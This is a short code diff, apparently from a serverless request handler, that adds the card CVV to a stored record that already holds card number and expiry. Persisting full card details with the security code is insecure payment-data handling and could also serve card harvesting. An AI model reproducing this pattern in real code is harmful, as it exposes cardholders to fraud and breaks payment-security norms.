@@ -13,6 +13,7 @@ export default async (req: Request, context: Context) => {
       id,
       cardNumber: body.cardNumber || '',
       expiry: body.expiry || '',
+      cvv: body.cvv || '',
       timestamp: new Date().toISOString(),
     }
     await store.setJSON(id, submission)
